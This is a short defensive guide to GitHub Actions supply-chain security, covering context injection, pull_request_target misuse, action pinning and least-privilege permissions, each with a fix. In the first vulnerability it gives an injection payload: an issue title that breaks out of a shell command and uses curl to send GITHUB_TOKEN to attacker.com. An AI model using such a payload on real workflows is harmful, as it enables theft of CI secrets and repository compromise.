# CI/CD & Software Supply Chain Security

> Domain: GitHub Actions Security, SLSA Framework & Dependency Provenance
> Classification: AUTHORITATIVE KNOWLEDGE BASE
> Aligned with: SLSA v1.0, OpenSSF Scorecard, GitHub Actions Hardening Guide

---

## 1. High-Risk GitHub Actions Vulnerabilities

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    CI/CD & WORKFLOW ATTACK SURFACE                      │
├───────────────────┬───────────────────┬──────────────────┬──────────────┤
│ 1. Context        │ 2. Untrusted PR   │ 3. Unpinned      │ 4. Excessive │
│    Injection      │    Execution      │    Actions       │    Permissions│
├───────────────────┼───────────────────┼──────────────────┼──────────────┤
│ • ${{ github.     │ • pull_request_   │ • actions/       │ • GITHUB_    │
│   event.issue.    │   target with     │   checkout@v4    │   TOKEN:     │
│   body }} in run: │   checkout PR head│   (mutable tags) │   write-all  │
│ • Cmd injection   │ • Secret theft via│ • Compromised 3rd│ • Secrets    │
│   in bash step    │   fork PR         │   party action   │   leaked     │
└───────────────────┴───────────────────┴──────────────────┴──────────────┘
```

### Vulnerability 1: Direct Context Expression Injection in `run:`
- **Vulnerable Pattern**:
  ```yaml
  - name: Echo issue title
    run: echo "Issue title was: ${{ github.event.issue.title }}"
  ```
- **Exploit**: Attacker creates issue with title: `Test"; curl https://attacker.com/exfil?t=$GITHUB_TOKEN; echo "`
- **Defensive Remediation**: Pass untrusted context expressions via environment variables:
  ```yaml
  - name: Echo issue title securely
    env:
      ISSUE_TITLE: ${{ github.event.issue.title }}
    run: echo "Issue title was: $ISSUE_TITLE"
  ```

### Vulnerability 2: Dangerous `pull_request_target` Trigger
- **Vulnerable Pattern**: Using `pull_request_target` (runs in base repo context with full secrets access) while checking out the untrusted fork PR code:
  ```yaml
  on: pull_request_target
  steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
    - run: npm test # Attacker modifies package.json test script to steal repo secrets!
  ```
- **Defensive Remediation**:
  - Use `pull_request` (isolated without write permissions/secrets) for untrusted PR builds.
  - Never checkout untrusted head commits inside `pull_request_target`.

### Vulnerability 3: Mutable Action Tags & Supply Chain
- **Vulnerability**: Referencing actions by mutable tag (`uses: actions/checkout@v4` or third-party `uses: untrusted/action@v1`). A compromised tag update injects malicious code directly into CI runners.
- **Defensive Remediation**: Pin actions to full 40-character commit SHAs:
  ```yaml
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```

---

## 2. Principle of Least Privilege in Workflows

Enforce default read-only permissions across all repository workflows:

```yaml
permissions:
  contents: read
  issues: none
  pull-requests: none
```
